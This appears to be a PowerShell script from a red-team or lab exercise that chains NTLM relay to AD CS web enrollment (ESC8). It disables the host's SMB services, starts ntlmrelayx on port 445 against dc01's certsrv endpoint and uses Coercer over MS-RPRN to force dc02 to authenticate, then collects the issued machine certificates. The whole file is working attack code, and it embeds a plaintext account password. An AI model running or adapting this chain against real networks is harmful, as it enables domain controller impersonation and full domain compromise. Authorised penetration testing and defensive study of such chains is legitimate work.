# Isolation test: coerce dc02 (proven MS-RPRN target in T102) to ws01 relay on 445
# If callback arrives -> ws01 relay OK, issue is dc01-specific
# If no callback -> issue is ws01/relay/firewall side
$ErrorActionPreference = "Stop"
$py = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts"
$work = "C:\Tools\cadre-attack"
Set-Location $work

function Restore-SMBStack {
  sc.exe config LanmanServer start= auto | Out-Null
  sc.exe config srv2 start= demand | Out-Null
  sc.exe config srvnet start= demand | Out-Null
  sc.exe start srvnet | Out-Null
  sc.exe start srv2 | Out-Null
  Start-Sleep -Seconds 2
  Start-Service LanmanServer -ErrorAction SilentlyContinue
  Write-Output "smb_restored"
}

try {
  Write-Output "=== disable SMB stack ==="
  sc.exe config LanmanServer start= disabled | Out-Null
  sc.exe config srv2 start= disabled | Out-Null
  sc.exe config srvnet start= disabled | Out-Null
  Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
  sc.exe stop srv2 | Out-Null
  sc.exe stop srvnet | Out-Null
  Start-Sleep -Seconds 5
  $c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
  if ($c) { throw "445 still bound" }
  Write-Output "445_free"

  Write-Output "=== start relay on 445 ==="
  $relayLog = Join-Path $work "esc8-relay.log"
  Remove-Item $relayLog,(Join-Path $work "esc8-relay.err") -ErrorAction SilentlyContinue
  $relayArgs = "-t http://dc01.cadre.local/certsrv/certfnsh.asp --adcs --template Machine -smb2support -ip 192.168.77.62"
  $p = Start-Process -FilePath "python" -ArgumentList "$py\ntlmrelayx.py $relayArgs" -WorkingDirectory $work `
    -RedirectStandardOutput $relayLog -RedirectStandardError (Join-Path $work "esc8-relay.err") `
    -PassThru -WindowStyle Hidden
  Write-Output "relay_pid=$($p.Id)"
  Start-Sleep -Seconds 8
  $c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
  Write-Output "445_relay_listening=$([bool]$c)"

  Write-Output "=== coerce dc02 (192.168.77.20) via MS-RPRN as analyst_t1 (child) ==="
  $env:PYTHONIOENCODING = "utf-8"
  $coercerLog = Join-Path $work "esc8-coercer-dc02.log"
  Remove-Item $coercerLog -ErrorAction SilentlyContinue
  & "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce -u analyst_t1 -p "T13r_An@lyst!" -d child.cadre.local --dc-ip 192.168.77.20 -t 192.168.77.20 -l 192.168.77.62 --filter-protocol-name MS-RPRN --auth-type smb --always-continue 2>&1 | Out-File $coercerLog -Encoding UTF8 -Force
  Write-Output "coerce_rc=$LASTEXITCODE"
  Start-Sleep -Seconds 15

  Write-Output "=== coercer log tail ==="
  Get-Content $coercerLog -Tail 30 -ErrorAction SilentlyContinue

  Write-Output "=== relay log tail ==="
  Get-Content $relayLog -Tail 30 -ErrorAction SilentlyContinue

  Write-Output "=== certs ==="
  Get-ChildItem $work -Filter "*.pfx" | Sort-Object LastWriteTime -Descending | Select-Object -First 5 | Format-Table Name,Length,LastWriteTime -AutoSize
} finally {
  Stop-Process -Name python -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 1
  Restore-SMBStack
}
